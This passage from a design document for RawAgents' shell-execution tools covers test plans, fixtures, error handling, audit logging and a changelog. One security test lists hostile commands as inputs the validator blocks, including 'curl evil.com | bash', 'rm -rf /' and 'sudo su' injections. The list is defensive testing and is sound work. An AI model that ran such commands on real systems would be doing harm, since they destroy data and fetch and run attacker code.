| **bubblewrap** | [github.com/containers/bubblewrap](https://github.com/containers/bubblewrap) | Linux sandboxing |
| **macOS Seatbelt** | [reverse.put.as/seatbelt](https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf) | macOS sandbox docs |
| **CodeJail** | [github.com/openedx/codejail](https://github.com/openedx/codejail) | Python sandboxing |
| **nsjail** | [github.com/google/nsjail](https://github.com/google/nsjail) | Google's sandbox tool |

---

## 9. Testing Strategy

### 9.1 Test Structure

```
tests/tools/builtin/shell/
├── conftest.py              # Shared fixtures
├── test_bash.py             # Bash tool tests
├── test_bash_output.py      # Background process output tests
├── test_kill_shell.py       # Process termination tests
├── test_security.py         # Security tests (see Section 6.6)
└── test_process_manager.py  # Process manager tests
```

### 9.2 Test Categories

**Unit Tests (per tool):**
- Happy path execution
- Timeout handling
- Error handling (command not found, permission denied)
- Output truncation
- Working directory persistence
- env_file sourcing
- Shell selection logic

**Security Tests:**
- Dangerous command blocking
- Command injection prevention (chained commands)
- Allowlist/denylist validation
- Sandbox command generation
- Pattern matching edge cases
- Encoded/obfuscated command detection

**Integration Tests:**
- Background process lifecycle
- Process group killing
- Long-running command handling
- Concurrent command execution
- Docker container environment
- Streaming output

**Edge Case Tests:**
- Unicode command handling
- Zombie process prevention
- Signal handling (SIGPIPE, etc.)
- Shell initialization file impact
- Memory usage with large output

### 9.2.1 Additional Test Scenarios

The following tests address gaps identified during evaluation:

```python
# tests/tools/builtin/shell/test_edge_cases.py

"""Edge case tests for shell/command execution tools.

These tests cover scenarios identified during PRD evaluation:
- Unicode handling
- Concurrent execution
- Zombie process prevention
- Docker environments
- CD command parsing
"""

import pytest
import asyncio
import subprocess
from pathlib import Path
from rawagents.tools.builtin.shell import bash, bash_output, kill_shell
from rawagents.tools.builtin.shell._security import (
    ShellSecurityContext,
    set_shell_security_context,
    CommandSecurityError,
)


class TestUnicodeHandling:
    """Test handling of unicode in commands and output."""

    async def test_unicode_in_command(self, shell_context):
        """Commands with unicode characters should work."""
        result = await bash("echo '你好世界 🌍'")
        assert "你好世界" in result or "Error" not in result

    async def test_unicode_in_path(self, shell_context, tmp_path):
        """Paths with unicode should be handled correctly."""
        unicode_dir = tmp_path / "目录"
        unicode_dir.mkdir()
        (unicode_dir / "файл.txt").write_text("content")

        result = await bash(f"cat '{unicode_dir}/файл.txt'")
        assert "content" in result

    async def test_unicode_in_output(self, shell_context):
        """Output with unicode should be decoded correctly."""
        result = await bash("printf '\\xE2\\x9C\\x93'")  # ✓
        assert "✓" in result or result.strip() != ""


class TestConcurrentExecution:
    """Test concurrent command execution."""

    async def test_parallel_commands(self, shell_context):
        """Multiple commands should run in parallel without interference."""
        results = await asyncio.gather(
            bash("sleep 0.1 && echo cmd1"),
            bash("sleep 0.1 && echo cmd2"),
            bash("sleep 0.1 && echo cmd3"),
        )

        assert "cmd1" in results[0]
        assert "cmd2" in results[1]
        assert "cmd3" in results[2]

    async def test_parallel_working_directory(self, shell_context, tmp_path):
        """Parallel cd commands should not interfere with each other."""
        dir1 = tmp_path / "dir1"
        dir2 = tmp_path / "dir2"
        dir1.mkdir()
        dir2.mkdir()

        # This test verifies process isolation
        # Each command runs in its own shell
        results = await asyncio.gather(
            bash(f"cd {dir1} && pwd"),
            bash(f"cd {dir2} && pwd"),
        )

        assert str(dir1) in results[0]
        assert str(dir2) in results[1]


class TestZombieProcessPrevention:
    """Test that no zombie processes are left behind."""

    async def test_no_zombies_after_timeout(self, shell_context):
        """Timed out processes should not become zombies."""
        # Start a process that will timeout
        result = await bash("sleep 100", timeout=100)  # 100ms

        assert "timed out" in result.lower()

        # Wait a moment for cleanup
        await asyncio.sleep(0.5)

        # Check for zombie processes (Unix-specific)
        ps_result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True,
        )

        # Should not have defunct sleep processes
        lines = [l for l in ps_result.stdout.split("\n") if "sleep 100" in l]
        zombie_lines = [l for l in lines if "<defunct>" in l or "Z" in l.split()[7:8]]
        assert len(zombie_lines) == 0, f"Found zombie processes: {zombie_lines}"

    async def test_no_zombies_after_kill(self, shell_context):
        """Killed background processes should not become zombies."""
        # Start background process
        result = await bash("sleep 100", run_in_background=True)
        pid = result.split("PID: ")[1].strip()

        # Kill it
        await kill_shell(pid=pid)

        # Wait for cleanup
        await asyncio.sleep(0.5)

        # Verify no zombies
        ps_result = subprocess.run(
            ["ps", "-p", pid],
            capture_output=True,
        )
        assert ps_result.returncode != 0, "Process should not exist"


class TestDockerEnvironment:
    """Test behavior in Docker-like environments."""

    def test_docker_detection(self):
        """Docker environment should be detected correctly."""
        from rawagents.tools.builtin.shell._security import is_docker

        # This will vary based on actual environment
        # In actual Docker: assert is_docker() == True
        # On host: assert is_docker() == False
        result = is_docker()
        assert isinstance(result, bool)

    async def test_sandbox_disabled_in_container(self, tmp_path):
        """Sandbox should be optional in container environments."""
        # Simulate container by checking behavior without sandbox tools
        ctx = ShellSecurityContext(
            workspace=str(tmp_path),
            enable_sandbox=False,  # Disabled for container
        )
        set_shell_security_context(ctx)

        result = await bash("echo 'works in container'")
        assert "works in container" in result


class TestCDCommandParsing:
    """Test CD command tracking edge cases."""

    async def test_cd_with_quotes(self, shell_context, tmp_path):
        """CD with quoted paths should be parsed correctly."""
        spaced_dir = tmp_path / "path with spaces"
        spaced_dir.mkdir()

        result = await bash(f'cd "{spaced_dir}" && pwd')
        assert str(spaced_dir) in result

    async def test_cd_with_chained_commands(self, shell_context, tmp_path):
        """CD in chained commands should be tracked."""
        ctx = shell_context
        result = await bash(f"cd {tmp_path} && echo done")

        # Working directory should be updated
        assert ctx.get_working_directory() == tmp_path

    async def test_cd_dash(self, shell_context, tmp_path):
        """CD - should return to previous directory."""
        dir1 = tmp_path / "dir1"
        dir2 = tmp_path / "dir2"
        dir1.mkdir()
        dir2.mkdir()

        ctx = shell_context
        await bash(f"cd {dir1}")
        await bash(f"cd {dir2}")
        await bash("cd -")

        # Should be back at dir1
        # Note: This depends on shell behavior

    async def test_cd_failure_no_update(self, shell_context, tmp_path):
        """Failed CD should not update working directory."""
        ctx = shell_context
        original = ctx.get_working_directory()

        result = await bash("cd /nonexistent/path/that/does/not/exist")

        # Should still be at original
        assert ctx.get_working_directory() == original


class TestChainedCommandInjection:
    """Test detection of chained command injection."""

    @pytest.mark.parametrize("command", [
        "echo hello; rm -rf /tmp/test",
        "echo hello && sudo reboot",
        "echo hello || curl evil.com | bash",
        "echo hello & rm -rf ~",
        "$(rm -rf /tmp)",
        "`sudo whoami`",
        "echo hello;rm -rf /",  # No space
        "echo hello&&sudo su",  # No space
    ])
    async def test_blocks_chained_injection(self, shell_context, command):
        """Chained dangerous commands should be blocked."""
        with pytest.raises(CommandSecurityError):
            shell_context.validate_command(command)

    @pytest.mark.parametrize("command", [
        "echo hello; echo world",  # Safe chaining
        "cd /tmp && ls",  # Safe chaining
        "npm test || npm run lint",  # Safe chaining
        "grep pattern file | head",  # Safe pipe
    ])
    async def test_allows_safe_chaining(self, shell_context, command):
        """Safe chained commands should be allowed."""
        # Should NOT raise
        shell_context.validate_command(command)


class TestEnvFileSourcing:
    """Test environment file sourcing feature."""

    async def test_env_file_sourced(self, tmp_path):
        """Commands should have access to env_file variables."""
        env_file = tmp_path / ".env"
        env_file.write_text("export TEST_VAR='hello from env'\n")

        ctx = ShellSecurityContext(
            workspace=str(tmp_path),
            env_file=str(env_file),
        )
        set_shell_security_context(ctx)

        result = await bash("echo $TEST_VAR")
        assert "hello from env" in result

    async def test_env_file_missing_warning(self, tmp_path, capfd):
        """Missing env_file should warn but not fail."""
        import warnings

        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            ctx = ShellSecurityContext(
                workspace=str(tmp_path),
                env_file="/nonexistent/env/file",
            )

            assert len(w) >= 1
            assert "does not exist" in str(w[0].message)


class TestStreamingOutput:
    """Test streaming output functionality."""

    async def test_streaming_lines(self, shell_context):
        """Output should be streamable line by line."""
        from rawagents.tools.builtin.shell._process_manager import stream_output

        process = await asyncio.create_subprocess_shell(
            "echo line1; echo line2; echo line3",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )

        lines = []
        async for line in stream_output(process):
            lines.append(line)

        assert "line1" in lines
        assert "line2" in lines
        assert "line3" in lines

    async def test_streaming_callback(self, shell_context):
        """Streaming callback should be invoked for each line."""
        from rawagents.tools.builtin.shell._process_manager import stream_output

        process = await asyncio.create_subprocess_shell(
            "echo a; echo b",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )

        callback_lines = []
        async for _ in stream_output(process, on_line=callback_lines.append):
            pass

        assert len(callback_lines) >= 2
```

### 9.3 Fixtures

```python
# tests/tools/builtin/shell/conftest.py

import pytest
import tempfile
import asyncio
from pathlib import Path
from rawagents.tools.builtin.shell._security import (
    ShellSecurityContext,
    set_shell_security_context,
)
from rawagents.tools.builtin.shell._process_manager import (
    ProcessManager,
    get_process_manager,
)


@pytest.fixture
def temp_workspace():
    """Create a temporary workspace directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = Path(tmpdir)

        # Create test files
        (workspace / "test.sh").write_text("#!/bin/bash\necho 'hello'\n")
        (workspace / "test.sh").chmod(0o755)

        yield workspace


@pytest.fixture
def shell_context(temp_workspace):
    """Create a shell security context."""
    ctx = ShellSecurityContext(workspace=str(temp_workspace))
    set_shell_security_context(ctx)
    yield ctx


@pytest.fixture
def sandboxed_context(temp_workspace):
    """Create a sandboxed shell context."""
    ctx = ShellSecurityContext(
        workspace=str(temp_workspace),
        enable_sandbox=True,
        sandbox_allow_network=False,
    )
    set_shell_security_context(ctx)
    yield ctx


@pytest.fixture
async def process_manager():
    """Get a clean process manager."""
    manager = ProcessManager()
    yield manager
    await manager.cleanup()
```

---

## 10. Project Structure

```
src/rawagents/tools/builtin/
├── __init__.py              # Exports all builtin tools
├── fs/                      # File system tools (existing)
│   ├── __init__.py
│   ├── _security.py
│   └── ...
├── shell/                   # Command execution tools (NEW)
│   ├── __init__.py          # Module exports
│   ├── _security.py         # ShellSecurityContext
│   ├── _process_manager.py  # Background process tracking
│   ├── _utils.py            # Shared utilities
│   ├── bash.py              # Bash tool
│   ├── bash_output.py       # BashOutput tool
│   └── kill_shell.py        # KillShell tool
├── permissions.py           # Shared permission system
└── web/                     # Web tools (future)
```

---

## 11. Development Process

### 11.1 Iterative Implementation

**IMPORTANT:** This PRD should be implemented **sequentially**:

```
For each component in [_security, _process_manager, bash, bash_output, kill_shell]:

    1. Research
       - Study reference implementations in Section 8
       - Understand edge cases (signals, process groups, etc.)
       - Test sandbox tools manually (bwrap, sandbox-exec)

    2. Test First
       - Write comprehensive tests before implementation
       - Include security tests (CRITICAL)
       - Include edge cases (timeout, kill, cleanup)

    3. Implement
       - Follow the pattern in Section 7
       - Integrate with ShellSecurityContext
       - Handle all error cases gracefully
       - Add docstrings and type hints

    4. Review
       - Security review for command validation
       - Test on Linux AND macOS
       - Performance testing for concurrent commands

    5. Document
       - Update docstrings
       - Add usage examples
       - Document platform differences
```

### 11.2 Implementation Order

| Phase | Components | Dependency |
|-------|------------|------------|
| Phase 0 | `_security.py` | None (implement first!) |
| Phase 1 | `_process_manager.py` | _security |
| Phase 2 | `bash.py` | _security, _process_manager |
| Phase 3 | `bash_output.py` | _process_manager |
| Phase 4 | `kill_shell.py` | _process_manager |
| Phase 5 | Integration tests | All tools |

### 11.3 Definition of Done

A tool is complete when:

- [ ] All tests pass (>90% coverage)
- [ ] **Security tests pass** (dangerous commands, injection, sandbox)
- [ ] Integrates with ShellSecurityContext
- [ ] Works on both Linux and macOS
- [ ] Timeout handling works correctly
- [ ] Process group killing works (no orphan processes)
- [ ] Error messages are clear and actionable
- [ ] Docstrings complete with examples
- [ ] Type hints for all parameters and return values
- [ ] Works with RawAgents `@tool` decorator
- [ ] Integration test with actual LLM passes

---

## 12. Error Handling and Logging

This section documents error recovery patterns and logging/audit capabilities for command execution tools.

### 12.1 Error Categories

| Category | Examples | Recovery Strategy |
|----------|----------|-------------------|
| **Security Errors** | Blocked command, injection detected | Return error message, log attempt |
| **Execution Errors** | Command not found, permission denied | Return stderr, suggest fix |
| **Timeout Errors** | Process exceeded timeout | Kill process, return partial output |
| **Resource Errors** | Out of memory, disk full | Return error, cleanup resources |
| **Sandbox Errors** | Sandbox tool missing, permission denied | Fallback or return clear error |

### 12.2 Error Recovery Patterns

```python
"""Error handling patterns for shell commands."""

from __future__ import annotations

import asyncio
import logging
from typing import Optional
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger("rawagents.shell")


class ErrorSeverity(Enum):
    """Severity levels for shell errors."""
    INFO = "info"        # Non-critical, command ran but had warnings
    WARNING = "warning"  # Command failed but recoverable
    ERROR = "error"      # Command failed, not recoverable
    SECURITY = "security"  # Security violation detected


@dataclass
class ShellError:
    """Structured error information from shell commands."""
    severity: ErrorSeverity
    message: str
    command: str
    exit_code: Optional[int] = None
    stderr: Optional[str] = None
    suggestion: Optional[str] = None

    def to_user_message(self) -> str:
        """Format error for display to user/LLM."""
        parts = [f"Error: {self.message}"]

        if self.exit_code is not None:
            parts.append(f"Exit code: {self.exit_code}")

        if self.stderr:
            parts.append(f"Details: {self.stderr[:500]}")  # Truncate

        if self.suggestion:
            parts.append(f"Suggestion: {self.suggestion}")

        return "\n".join(parts)


# Error suggestions for common failures
ERROR_SUGGESTIONS = {
    "command not found": "Check if the command is installed and in PATH",
    "permission denied": "Check file permissions or try a different directory",
    "no such file or directory": "Verify the path exists",
    "disk quota exceeded": "Free up disk space",
    "cannot allocate memory": "Close other applications or increase memory",
    "connection refused": "Check if the service is running",
    "timeout": "Try increasing the timeout or running in background",
}


def suggest_fix(stderr: str) -> Optional[str]:
    """Suggest a fix based on error output."""
    stderr_lower = stderr.lower()
    for pattern, suggestion in ERROR_SUGGESTIONS.items():
        if pattern in stderr_lower:
            return suggestion
    return None


async def execute_with_recovery(
    command: str,
    max_retries: int = 0,
    retry_delay: float = 1.0,
) -> tuple[str, Optional[ShellError]]:
    """Execute command with optional retry logic.

    Args:
        command: The shell command to execute.
        max_retries: Maximum retry attempts (0 = no retry).
        retry_delay: Delay between retries in seconds.

    Returns:
        Tuple of (output, error). Error is None on success.

    Example:
        >>> output, error = await execute_with_recovery(
        ...     "git fetch origin",
        ...     max_retries=2,  # Retry network errors
        ... )
        >>> if error:
        ...     print(error.to_user_message())
    """
    last_error = None

    for attempt in range(max_retries + 1):
        try:
            result = await bash(command)

            if not result.startswith("Error:"):
                return result, None

            # Parse error
            last_error = ShellError(
                severity=ErrorSeverity.ERROR,
                message=result,
                command=command,
                suggestion=suggest_fix(result),
            )

            # Some errors are not retryable
            if "permission denied" in result.lower():
                break
            if "command not found" in result.lower():
                break

        except Exception as e:
            last_error = ShellError(
                severity=ErrorSeverity.ERROR,
                message=str(e),
                command=command,
            )

        if attempt < max_retries:
            logger.info(f"Retrying command (attempt {attempt + 2}): {command}")
            await asyncio.sleep(retry_delay)

    return "", last_error
```

### 12.3 Logging and Audit Trail

The shell tools support comprehensive logging for debugging and security auditing.

**Logging Configuration:**

```python
"""Logging configuration for shell commands."""

import logging
import json
from datetime import datetime
from typing import Optional
from pathlib import Path


class ShellAuditLogger:
    """Audit logger for shell command execution.

    Logs all command executions with:
    - Timestamp
    - Command executed
    - Working directory
    - User/agent identifier
    - Exit code and result summary
    - Security events (blocked commands)
    """

    def __init__(
        self,
        log_file: Optional[Path] = None,
        log_level: int = logging.INFO,
    ):
        self.logger = logging.getLogger("rawagents.shell.audit")
        self.logger.setLevel(log_level)

        if log_file:
            handler = logging.FileHandler(log_file)
            handler.setFormatter(logging.Formatter(
                "%(asctime)s - %(levelname)s - %(message)s"
            ))
            self.logger.addHandler(handler)

    def log_execution(
        self,
        command: str,
        working_dir: str,
        exit_code: Optional[int],
        duration_ms: float,
        truncated: bool = False,
    ) -> None:
        """Log a command execution."""
        entry = {
            "event": "command_executed",
            "timestamp": datetime.now().isoformat(),
            "command": command[:200],  # Truncate long commands
            "working_dir": working_dir,
            "exit_code": exit_code,
            "duration_ms": round(duration_ms, 2),
            "truncated": truncated,
        }
        self.logger.info(json.dumps(entry))

    def log_security_event(
        self,
        command: str,
        reason: str,
        pattern: Optional[str] = None,
    ) -> None:
        """Log a security event (blocked command, etc.)."""
        entry = {
            "event": "security_blocked",
            "timestamp": datetime.now().isoformat(),
            "command": command[:200],
            "reason": reason,
            "pattern": pattern,
        }
        self.logger.warning(json.dumps(entry))

    def log_background_process(
        self,
        pid: str,
        command: str,
        action: str,  # "started", "output_read", "killed"
    ) -> None:
        """Log background process lifecycle events."""
        entry = {
            "event": f"background_{action}",
            "timestamp": datetime.now().isoformat(),
            "pid": pid,
            "command": command[:200],
        }
        self.logger.info(json.dumps(entry))


# Global audit logger instance
_audit_logger: Optional[ShellAuditLogger] = None


def configure_audit_logging(
    log_file: Optional[Path] = None,
    log_level: int = logging.INFO,
) -> None:
    """Configure the global audit logger.

    Example:
        >>> configure_audit_logging(
        ...     log_file=Path("~/.rawagents/shell_audit.log").expanduser(),
        ...     log_level=logging.DEBUG,
        ... )
    """
    global _audit_logger
    _audit_logger = ShellAuditLogger(log_file, log_level)


def get_audit_logger() -> Optional[ShellAuditLogger]:
    """Get the global audit logger."""
    return _audit_logger
```

**Integration with bash tool:**

```python
# In bash.py, add audit logging:

async def bash(...) -> str:
    audit = get_audit_logger()
    start_time = time.monotonic()

    try:
        # ... execution logic ...

        if audit:
            audit.log_execution(
                command=command,
                working_dir=str(ctx.get_working_directory()),
                exit_code=process.returncode,
                duration_ms=(time.monotonic() - start_time) * 1000,
                truncated=len(output) > MAX_OUTPUT_BYTES,
            )

        return output

    except CommandSecurityError as e:
        if audit:
            audit.log_security_event(
                command=command,
                reason=e.reason,
                pattern=e.pattern,
            )
        return f"Error: {e}"
```

### 12.4 Error Message Guidelines

Error messages should be:
1. **Clear:** Explain what went wrong
2. **Actionable:** Suggest how to fix it
3. **Safe:** Don't leak sensitive information

**Good error messages:**
```
Error: Command timed out after 120 seconds
Suggestion: Try running with a longer timeout or use run_in_background=True

Error: Command blocked for security reasons
The command matches a dangerous pattern. If this is intentional, contact your administrator.

Error: Permission denied accessing /etc/passwd
Check file permissions or run in a directory where you have write access.
```

**Bad error messages:**
```
Error: EPERM  (Too cryptic)

Error: sudo rm -rf / blocked  (Reveals the attempted command)

Error: Failed  (No useful information)
```

---

## Appendix A: Dependencies

**Required:**
```toml
[project.dependencies]
# Core
pydantic = ">=2.0"

# No additional dependencies required - uses stdlib asyncio
```

**Optional (for sandboxing):**
```bash
# Linux
apt install bubblewrap

# macOS - built-in, no installation needed
```

**Development:**
```toml
[project.optional-dependencies]
dev = [
    "pytest>=7.0",
    "pytest-asyncio>=0.21",
    "pytest-cov>=4.0",
    "pytest-timeout>=2.0",
]
```

---

## Appendix B: Related Documents

- [RawAgents Vision](../vision.md)
- [RawAgents Philosophy](../rawagents_philosophy.md)
- [File System Tools PRD](./005_filesystem_tools_v1.md)
- [Tool Executor PRD](./003_tool_executor_v1.md)
- [Loops PRD](./004_loops_v1.md)

---

## Appendix C: Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | Feb 2026 | Initial PRD |
| 1.1 | Feb 2026 | Added: `dangerously_disable_sandbox` parameter, expanded deny patterns (sudo, privilege escalation, pipe-to-shell attacks, reverse shells), shell state reset documentation, improved cd tracking (handles ~, -, chained commands), evaluation-based refinements |
| 2.0 | Feb 2026 | **Comprehensive Revision** based on expert evaluation. Major additions: |
| 2.1 | Feb 2026 | **Gap Resolution** — 7 gaps identified and fixed via multi-agent review (OpenCode researcher, Claude Code researcher, codebase reviewer). See Version 2.1 changes below. |

### Version 2.0 Detailed Changes

**HIGH Priority Fixes:**
1. **Expanded Deny Patterns** - Added 80+ patterns covering:
   - Chained command injection (`*; rm -rf *`, `*&& sudo *`, etc.)
   - Command substitution (`*$(rm *)*`, backticks)
   - Environment variable injection
   - Container escape attempts
   - Scheduled task manipulation
   - Output redirection to system files

2. **Improved Pattern Matching Logic** - Now uses both:
   - `match()` for full command matching
   - `search()` for finding dangerous patterns within chained commands
   - Segment-based analysis for commands with shell metacharacters

3. **Sandbox Availability Checks** - Added `_check_sandbox_availability()`:
   - Validates bwrap/sandbox-exec exists before enabling sandbox
   - Raises `SandboxNotAvailableError` with installation instructions
   - Graceful degradation on Windows

**MEDIUM Priority Additions:**
4. **Environment File Support** - New `env_file` parameter:
   - Sources a file before each command for persistent environment variables
   - Configurable via `RAWAGENTS_ENV_FILE` environment variable
   - Matches Claude Code's `CLAUDE_ENV_FILE` functionality

5. **Timeout Configuration** - Environment variable overrides:
   - `RAWAGENTS_BASH_DEFAULT_TIMEOUT_MS`
   - `RAWAGENTS_BASH_MAX_TIMEOUT_MS`

6. **Docker Container Documentation** - New Section 6.6:
   - Process group killing limitations in Docker
   - Workarounds using `setsid` and `start_new_session`
   - Container-aware context configuration
   - Sandbox interaction guidance

7. **Streaming Output Architecture** - New Section 7.2:
   - `stream_output()` async generator for line-by-line output
   - `stream_with_timeout()` for bounded streaming
   - Deadlock prevention patterns
   - Integration with ProcessManager

8. **CD Command Parsing Improvements**:
   - New `_extract_cd_target()` function with proper quote handling
   - Handles all command separators (`;`, `&&`, `||`, `|`)
   - Only updates directory on successful commands (exit code 0)
   - Added `maintain_project_working_dir` option

**Code Quality Improvements:**
9. **Comprehensive Test Scenarios** - New tests for:
   - Unicode handling in commands and output
   - Concurrent execution isolation
   - Zombie process prevention
   - Docker environment detection
   - CD command parsing edge cases
   - Chained command injection detection
   - Environment file sourcing
   - Streaming output

10. **Error Handling & Logging** - New Section 12:
    - Error categories and recovery patterns
    - `ShellAuditLogger` for security auditing
    - Error message guidelines
    - Retry logic with `execute_with_recovery()`

11. **Additional Security References**:
    - OWASP Command Injection
    - OWASP OS Command Defense Cheat Sheet
    - Claude Code environment variable discussions

### Version 2.1 Gap Resolution Changes

**GAP-1 (HIGH): Shell Blacklisting**
- Added `INCOMPATIBLE_SHELLS = frozenset({"fish", "nu", "nushell", "xonsh", "elvish", "ion", "murex"})` class attribute
- `get_shell()` now checks `$SHELL` against blacklist before using it
- Emits `UserWarning` when incompatible shell is detected, falls back to platform default
- Reference: OpenCode issue #8716 (nushell), Claude Code issue #11475 (fish)

**GAP-2 (HIGH): macOS Default Shell**
- `get_shell()` now detects platform via `platform.system()`
- Returns `/bin/zsh` on Darwin (macOS default since Catalina 10.15)
- Returns `/bin/bash` on Linux
- Falls back to `/bin/sh` as last resort

**GAP-3 (MEDIUM): Dual Truncation**
- Added `MAX_OUTPUT_LINES = 2000` constant alongside `MAX_OUTPUT_BYTES = 50KB`
- Truncation logic now checks both limits (whichever is hit first)
- Matches OpenCode behavior (MAX_LINES=2000, MAX_BYTES=51200)

**GAP-4 (MEDIUM): Truncated Output Persistence**
- Full output now written to temp file via `tempfile.NamedTemporaryFile`
- Truncation message includes file path for retrieval
- Matches OpenCode pattern of persisting full output to disk

**GAP-5 (MEDIUM): Event-Based Waiting**
- Added `_new_output_event: asyncio.Event` field to `ProcessInfo`
- `_collect_output()` signals event on each new line and on process completion
- `get_output()` now uses `asyncio.wait_for(event.wait(), timeout=...)` instead of fixed `asyncio.sleep()`
- Returns immediately when new output available, or after timeout

**GAP-6 (LOW): Cancellation/Abort Documentation**
- New Section 5.4: Cancellation / Abort Pattern
- Includes ASCII escalation diagram (SIGTERM → 5s → SIGKILL)
- Scenario table covering foreground/background/hung/user-abort
- Agent usage pattern with code example

**GAP-7 (LOW): ProcessManager Global State Documentation**
- Added explicit design decision comment explaining why ProcessManager is a module-level singleton
- Documents rationale: OS processes are inherently global, cross-coroutine visibility required
- Contrasts with ShellSecurityContext (contextvars) which needs per-agent isolation

### Version 2.2 Refinements

**Expanded Shell Blacklist**
- Added `xonsh`, `elvish`, `ion`, `murex` to `INCOMPATIBLE_SHELLS` (matches OpenCode's extended list)
- xonsh: Python-based shell with mixed syntax; elvish: own expression language; ion: Rust shell; murex: typed shell

**Output Buffer Bounding**
- Added `MAX_BUFFER_LINES = 10_000` class variable on `ProcessInfo`
- `_collect_output()` evicts oldest lines when buffer exceeds limit
- Adjusts `last_read_index` to prevent stale references after eviction
- Prevents unbounded memory growth for long-running background processes
